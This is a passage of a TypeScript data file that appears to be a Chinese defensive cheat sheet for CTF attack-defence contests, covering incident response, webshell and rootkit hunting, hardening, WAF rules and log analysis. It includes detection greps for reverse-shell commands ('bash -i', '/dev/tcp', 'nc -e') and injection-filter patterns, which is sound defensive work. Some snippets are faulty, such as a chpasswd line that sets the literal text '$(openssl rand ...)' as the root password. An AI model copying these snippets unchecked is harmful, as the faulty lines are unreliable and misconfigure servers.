    fix: `# === 异常进程 ===\nps aux | sort -nrk 3 | head -20\nps auxf  # 查看进程树\n\n# === 异常网络 ===\nnetstat -antlp | grep ESTAB\nss -antlp | grep ESTAB\nlsof -i -P | grep LISTEN\n\n# === 定时任务 ===\nfor u in $(cut -d: -f1 /etc/passwd); do echo "== $u =="; crontab -l -u $u 2>/dev/null; done\nls -la /etc/cron*\ncat /var/spool/cron/*\n\n# === 最近修改 ===\nfind /var/www /tmp /opt /root -mmin -60 -type f 2>/dev/null\n\n# === 登录记录 ===\nlast -n 20\nlastlog | grep -v Never\ncat /var/log/auth.log | tail -50\n\n# === 异常用户 ===\nawk -F: '$3==0{print $1}' /etc/passwd\nawk -F: '$7!~/nologin|false/{print $1,$7}' /etc/passwd\ngrep -v '^#' /etc/sudoers | grep -v '^$'`,
    oneliner: `ps aux | awk '$3>50{print}' && netstat -antlp | grep ESTAB | head -20`,
    tags: ['应急', 'emergency', 'audit', '排查', '后门'],
  },
  {
    id: 'sh-webshell', lang: 'Shell', vuln: 'WebShell查杀', title: 'WebShell一键查杀(全语言)',
    desc: '查找Web目录下所有可疑文件',
    fix: `# === PHP ===\ngrep -rn 'eval(\\|assert(\\|base64_decode(\\|gzinflate(\\|str_rot13(\\|system(\\|exec(' --include='*.php' /var/www\nfind /var/www -name '*.php' -mmin -60\n\n# === JSP ===\ngrep -rn 'Runtime.getRuntime\\|ProcessBuilder\\|getClass().forName' --include='*.jsp' /var/www\n\n# === ASP/ASPX ===\ngrep -rn 'eval(\\|Execute(\\|CreateObject' --include='*.asp' --include='*.aspx' /var/www\n\n# === Python ===\ngrep -rn 'eval(\\|exec(\\|os.system\\|subprocess' --include='*.py' /var/www\n\n# === 隐藏文件 ===\nfind /var/www -name '.*' -type f\nfind /var/www -name '*.php*' ! -name '*.php'\nfind /var/www -type f -perm /111 -name '*.php'\n\n# === 对比备份 ===\ndiff -rq /var/www /var/www.bak 2>/dev/null\n\n# === 文件完整性 ===\nfind /var/www -name '*.php' -exec md5sum {} \\; > /tmp/webfiles.md5`,
    oneliner: `find /var/www -name '*.php' -mmin -60 -exec grep -l 'eval(\\|system(\\|base64_decode(' {} \\;`,
    tags: ['webshell', '查杀', 'backdoor', 'kill'],
  },
  {
    id: 'sh-passwd', lang: 'Shell', vuln: '权限加固', title: '关键文件权限加固(比赛必做)',
    desc: '比赛中快速加固关键文件权限',
    fix: `# 锁定密码文件\nchattr +i /etc/passwd /etc/shadow /etc/group /etc/sudoers\n\n# Web目录只读(防篡改)\nchattr -R +i /var/www/html/\n\n# 限制tmp执行\nmount -o remount,noexec /tmp\nmount -o remount,noexec /dev/shm\n\n# 解锁(需要修改时)\n# chattr -i /etc/passwd`,
    oneliner: `chattr +i /etc/passwd /etc/shadow && chattr -R +i /var/www/html/`,
    tags: ['chattr', '权限', '加固', 'permission'],
  },
  {
    id: 'sh-rootkit', lang: 'Shell', vuln: 'Rootkit检测', title: 'Rootkit/后门检测',
    desc: '检测常见Rootkit和系统后门',
    fix: `# 检查系统命令是否被替换\nrpm -Va 2>/dev/null | grep '^..5' | head -20  # RPM系\ndpkg -V 2>/dev/null | head -20  # DEB系\n\n# 检查LD_PRELOAD劫持\nenv | grep LD_PRELOAD\ncat /etc/ld.so.preload\nfind / -name '*.so' -mmin -1440 2>/dev/null\n\n# 检查SSH后门\nstrings /usr/sbin/sshd | grep -i password | head -5\nmd5sum /usr/sbin/sshd\n\n# 检查PAM后门\nfind /lib/security /lib64/security -name '*.so' -mmin -1440 2>/dev/null\n\n# 检查内核模块\nlsmod | head -20\nfind /lib/modules -name '*.ko' -mmin -1440 2>/dev/null\n\n# 检查异常SUID\nfind / -perm -4000 -type f 2>/dev/null\n\n# 使用rkhunter\nrkhunter --check --skip-keypress 2>/dev/null`,
    oneliner: `env | grep LD_PRELOAD; cat /etc/ld.so.preload 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20`,
    tags: ['rootkit', '后门', 'ld_preload', 'suid'],
  },
  {
    id: 'sh-network', lang: 'Shell', vuln: '网络排查', title: '异常网络连接排查',
    desc: '排查反弹Shell、C2通信、隧道',
    fix: `# 所有外连\nnetstat -antlp | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn\n\n# 反弹Shell特征\nlsof -i -P | grep -E ':(4444|5555|6666|7777|8888|9999)'\nss -antlp | grep -v LISTEN | awk '{print $5}' | grep -E ':(4444|5555|6666|7777|8888|9999)'\n\n# DNS隧道检测\ntcpdump -i any port 53 -nn -c 100 2>/dev/null | awk '{print $NF}' | sort | uniq -c | sort -rn | head -20\n\n# 大流量检测\niftop -t -s 10 2>/dev/null || nethogs -t -c 5 2>/dev/null\n\n# 进程网络关联\nfor pid in $(ss -antlp | grep ESTAB | awk -F'pid=' '{print $2}' | cut -d, -f1 | sort -u); do echo "PID=$pid $(cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ')"; done`,
    oneliner: `netstat -antlp | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10`,
    tags: ['network', '网络', '反弹shell', 'c2', '外连'],
  },
  {
    id: 'sh-persist', lang: 'Shell', vuln: '持久化排查', title: '持久化机制排查',
    desc: '排查所有常见Linux持久化手段',
    fix: `# === crontab ===\nfor u in $(cut -d: -f1 /etc/passwd); do echo "[$u]"; crontab -l -u $u 2>/dev/null; done\ncat /etc/crontab\nls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/\n\n# === systemd服务 ===\nsystemctl list-unit-files --type=service | grep enabled\nfind /etc/systemd/system /usr/lib/systemd/system -mmin -1440 -name '*.service' 2>/dev/null\n\n# === rc.local / init.d ===\ncat /etc/rc.local 2>/dev/null\nls -la /etc/init.d/\n\n# === bashrc/profile ===\ngrep -r 'bash -i\\|/dev/tcp\\|nc -e\\|curl.*|.*sh\\|wget.*|.*sh' /home/*/.bashrc /root/.bashrc /etc/profile /etc/bash.bashrc 2>/dev/null\n\n# === SSH authorized_keys ===\nfind / -name authorized_keys -exec ls -la {} \\; -exec cat {} \\; 2>/dev/null\n\n# === .ssh/config ===\nfind /home /root -name config -path '*/.ssh/*' -exec cat {} \\; 2>/dev/null`,
    oneliner: `find /etc/systemd/system -mmin -1440 -name '*.service' 2>/dev/null; for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | grep -v '^#'; done`,
    tags: ['persist', '持久化', 'cron', 'systemd', 'bashrc', 'authorized_keys'],
  },
  {
    id: 'sh-docker', lang: 'Shell', vuln: 'Docker加固', title: 'Docker容器安全加固',
    desc: 'Docker逃逸防护和容器加固',
    fix: `# 检查特权容器\ndocker ps --format '{{.Names}}' | xargs -I{} docker inspect {} --format='{{.Name}} privileged={{.HostConfig.Privileged}}'\n\n# 检查挂载了宿主机目录的容器\ndocker ps -q | xargs docker inspect --format='{{.Name}} {{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}' | grep -v '/var/lib/docker'\n\n# 限制容器能力\n# docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE ...\n\n# 只读文件系统\n# docker run --read-only ...\n\n# 限制资源\n# docker run --memory=512m --cpus=1 ...\n\n# 检查Docker API暴露\nss -antlp | grep 2375\ncurl -s http://localhost:2375/version 2>/dev/null`,
    oneliner: `docker ps --format '{{.Names}}' | xargs -I{} docker inspect {} --format='{{.Name}} priv={{.HostConfig.Privileged}}'`,
    tags: ['docker', '容器', '逃逸', '加固'],
  },
  {
    id: 'sh-log', lang: 'Shell', vuln: '日志分析', title: '安全日志快速分析',
    desc: '分析auth/access/syslog关键日志',
    fix: `# === SSH暴力破解 ===\ngrep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10\ngrep 'Accepted' /var/log/auth.log | tail -20\n\n# === Web攻击 ===\nawk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20  # Top IP\ngrep -iE 'union|select|eval|exec|/etc/passwd|\\.\\./|<script' /var/log/nginx/access.log | tail -50  # 攻击特征\nawk '$9>=400{print $1,$7,$9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20  # 异常状态码\n\n# === 提权检测 ===\ngrep -iE 'sudo|su -|su root' /var/log/auth.log | tail -20\n\n# === 系统异常 ===\ndmesg | grep -iE 'error|fail|oom|killed' | tail -20\njournalctl -p err --since '1 hour ago' 2>/dev/null | tail -30`,
    oneliner: `grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10`,
    tags: ['log', '日志', '分析', 'auth', 'access'],
  },
  {
    id: 'sh-baseline', lang: 'Shell', vuln: '基线加固', title: '比赛开局加固Checklist',
    desc: '比赛开始后前5分钟必做项',
    fix: `# 1. 修改所有默认密码\necho 'root:$(openssl rand -base64 16)' | chpasswd\npasswd  # 交互式改密码\n\n# 2. 备份Web目录\ncp -a /var/www /var/www.bak\ntar czf /tmp/web_backup_$(date +%s).tar.gz /var/www\n\n# 3. 锁定关键文件\nchattr +i /etc/passwd /etc/shadow\nchattr -R +i /var/www/html/\n\n# 4. 禁用危险PHP函数\necho 'disable_functions=system,exec,passthru,shell_exec,popen,proc_open,eval,assert' >> /etc/php.ini\nsystemctl restart php-fpm 2>/dev/null\n\n# 5. 防火墙(只开比赛端口)\niptables -P INPUT DROP\niptables -A INPUT -i lo -j ACCEPT\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT\n\n# 6. 检查异常用户和SUID\nawk -F: '$3==0&&$1!="root"{print}' /etc/passwd\nfind / -perm -4000 -type f 2>/dev/null\n\n# 7. 开启审计日志\nservice auditd start 2>/dev/null\nauditctl -w /etc/passwd -p wa -k passwd_changes\nauditctl -w /var/www -p wa -k web_changes`,
    oneliner: `cp -a /var/www /var/www.bak && chattr +i /etc/passwd /etc/shadow && iptables -P INPUT DROP && iptables -A INPUT -i lo -j ACCEPT && iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT && iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT`,
    tags: ['baseline', '加固', '基线', 'checklist', '比赛', '开局'],
  },
  {
    id: 'sh-waf-nginx', lang: 'Shell', vuln: 'WAF', title: 'Nginx简易WAF(比赛邪修)',
    desc: 'Nginx层面快速过滤常见攻击',
    fix: `# 在 nginx server{} 块中添加:\n\n# 封禁常见攻击路径\nlocation ~* \\.(bak|sql|tar|gz|zip|log|swp|old|conf)$ {\n    return 403;\n}\n\n# SQL注入过滤\nif ($query_string ~* "union.*select|select.*from|insert.*into|delete.*from|drop.*table|update.*set") {\n    return 403;\n}\n\n# 文件包含过滤\nif ($query_string ~* "\\.\\./|\\.\\.\\\\\\\\|etc/passwd|proc/self") {\n    return 403;\n}\n\n# XSS过滤\nif ($query_string ~* "<script|javascript:|onerror=|onload=") {\n    return 403;\n}\n\n# 命令注入过滤\nif ($query_string ~* ";|\\||\\$\\(|\\x60|%0a|%0d") {\n    return 403;\n}\n\n# 限流\nlimit_req_zone $binary_remote_addr zone=req:10m rate=30r/s;\nserver {\n    limit_req zone=req burst=50 nodelay;\n}`,
    oneliner: `# 快速添加到nginx配置: 注意需要在http或server块内\nnginx -t && systemctl reload nginx`,
    tags: ['waf', 'nginx', '过滤', '邪修', '比赛'],
  },
  {
    id: 'sh-waf-apache', lang: 'Shell', vuln: 'WAF', title: 'Apache mod_rewrite WAF',
    desc: 'Apache .htaccess 快速防御',
    fix: `# .htaccess 添加:\nRewriteEngine On\n\n# SQL注入\nRewriteCond %{QUERY_STRING} union.*select [NC,OR]\nRewriteCond %{QUERY_STRING} select.*from [NC,OR]\nRewriteCond %{QUERY_STRING} insert.*into [NC,OR]\nRewriteCond %{QUERY_STRING} drop.*table [NC,OR]\n\n# 文件包含\nRewriteCond %{QUERY_STRING} \\.\\.\\/\\.\\. [NC,OR]\nRewriteCond %{QUERY_STRING} etc\\/passwd [NC,OR]\n\n# 命令注入\nRewriteCond %{QUERY_STRING} ;.*\\/ [NC,OR]\nRewriteCond %{QUERY_STRING} \\$\\( [NC,OR]\n\n# XSS\nRewriteCond %{QUERY_STRING} <script [NC]\nRewriteRule .* - [F,L]`,
    oneliner: `echo 'RewriteEngine On' >> /var/www/.htaccess`,
    tags: ['waf', 'apache', 'htaccess', '过滤'],
  },
  {
    id: 'sh-traffic', lang: 'Shell', vuln: '流量分析', title: '比赛流量抓包分析',
    desc: '快速抓包和分析攻击流量',
    fix: `# 抓取HTTP流量\ntcpdump -i any port 80 -A -s 0 -c 1000 -w /tmp/traffic.pcap\n\n# 实时查看HTTP请求\ntcpdump -i any port 80 -A | grep -E 'GET |POST |Host:'\n\n# 分析攻击IP\ntcpdump -nr /tmp/traffic.pcap | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | head\n\n# 搜索攻击Payload\nstrings /tmp/traffic.pcap | grep -iE 'union|select|eval|exec|passwd|flag|cmd'\n\n# 用tshark分析\ntshark -r /tmp/traffic.pcap -T fields -e ip.src -e http.request.uri 2>/dev/null | sort | uniq -c | sort -rn | head`,
    oneliner: `tcpdump -i any port 80 -A -c 200 2>/dev/null | grep -iE 'union|select|eval|exec|flag'`,
    tags: ['traffic', 'tcpdump', 'pcap', '抓包', '流量'],
  },
  {
    id: 'sh-flag', lang: 'Shell', vuln: '比赛技巧', title: 'Flag防护/监控',
    desc: '监控flag文件，防止被读取或篡改',
    fix: `# 找到flag文件\nfind / -name 'flag*' -o -name '*flag*' 2>/dev/null\n\n# 监控flag文件读取\nauditctl -w /flag -p r -k flag_read\nauditctl -w /root/flag.txt -p rwa -k flag_access\n\n# 实时监控文件访问\ninotifywait -m /flag 2>/dev/null &\n\n# 定期检查flag完整性\nwhile true; do\n  md5=$(md5sum /flag 2>/dev/null | awk '{print $1}')\n  if [ "$md5" != "ORIGINAL_MD5" ]; then\n    echo "FLAG CHANGED at $(date)" >> /tmp/flag_alert.log\n    # 恢复flag\n    echo 'original_flag_content' > /flag\n  fi\n  sleep 5\ndone &`,
    oneliner: `md5sum /flag* /root/flag* 2>/dev/null && auditctl -w /flag -p rwa -k flag 2>/dev/null`,
    tags: ['flag', '比赛', 'ctf', '监控', '防护'],
  },
];

// ═══════════════════════════════════════
// SQL / 数据库
// ═══════════════════════════════════════
const sql: SecFixSnippet[] = [
  {
    id: 'sql-mysql', lang: 'SQL', vuln: 'MySQL加固', title: 'MySQL安全加固',
    desc: '删除匿名用户、限制远程root',
    fix: `DELETE FROM mysql.user WHERE User='';\nDELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost','127.0.0.1','::1');\nDROP DATABASE IF EXISTS test;\nALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongP@ss!';\nFLUSH PRIVILEGES;`,
    oneliner: `mysql -uroot -e "DELETE FROM mysql.user WHERE User=''; FLUSH PRIVILEGES;"`,
    tags: ['mysql', '加固'],
  },
  {
    id: 'sql-mysql-log', lang: 'SQL', vuln: 'MySQL审计', title: 'MySQL开启审计日志',
    desc: '开启通用日志和慢查询日志',
    fix: `-- 开启通用查询日志(记录所有SQL)\nSET GLOBAL general_log = 'ON';\nSET GLOBAL general_log_file = '/var/log/mysql/general.log';\n\n-- 开启慢查询日志\nSET GLOBAL slow_query_log = 'ON';\nSET GLOBAL long_query_time = 2;\n\n-- 查看当前连接\nSHOW PROCESSLIST;\n\n-- 查看用户权限\nSELECT user,host,authentication_string FROM mysql.user;`,
    oneliner: `mysql -uroot -e "SET GLOBAL general_log='ON'; SHOW PROCESSLIST;"`,
    tags: ['mysql', 'audit', '审计', '日志'],
  },
  {
    id: 'sql-redis', lang: 'SQL', vuln: 'Redis加固', title: 'Redis安全加固',
    desc: 'Redis未授权访问防护',
    fix: `# redis.conf\nbind 127.0.0.1\nprotected-mode yes\nrequirepass YourStrongPassword\nrename-command FLUSHDB ""\nrename-command FLUSHALL ""\nrename-command CONFIG ""\nrename-command KEYS ""\nrename-command DEBUG ""\nrename-command EVAL ""`,
    oneliner: `redis-cli CONFIG SET requirepass 'YourStrongPassword' && redis-cli -a YourStrongPassword CONFIG SET protected-mode yes`,
    tags: ['redis', '加固', '未授权'],
  },
  {
    id: 'sql-pg', lang: 'SQL', vuln: 'PostgreSQL加固', title: 'PostgreSQL安全加固',
    desc: 'PostgreSQL访问控制和权限加固',
    fix: `-- 修改默认密码\nALTER USER postgres PASSWORD 'StrongP@ss!';\n\n-- pg_hba.conf (限制访问)\n# local  all  all  md5\n# host   all  all  127.0.0.1/32  md5\n# 禁止远程trust认证\n\n-- 关闭不需要的扩展\nDROP EXTENSION IF EXISTS dblink;\nDROP EXTENSION IF EXISTS pg_execute_external_program;\n\n-- 检查权限\nSELECT usename, usecreatedb, usesuper FROM pg_user;`,
    oneliner: `psql -U postgres -c "ALTER USER postgres PASSWORD 'StrongP@ss!';"`,
    tags: ['postgresql', 'pg', '加固'],
  },
];

// ═══════════════════════════════════════
// 导出
// ═══════════════════════════════════════
export const ALL_SNIPPETS: SecFixSnippet[] = [
  ...python, ...php, ...java, ...javascript, ...golang, ...c_cpp, ...shell, ...sql,
];

export const LANGUAGES = [
  { key: 'all', label: '全部' },
  { key: 'Python', label: 'Python' },
  { key: 'PHP', label: 'PHP' },
  { key: 'Java', label: 'Java' },
  { key: 'JavaScript', label: 'JS/Node' },
  { key: 'Go', label: 'Go' },
  { key: 'C/C++', label: 'C/C++' },
  { key: 'Shell', label: 'Shell/系统' },
  { key: 'SQL', label: 'SQL/DB' },
];
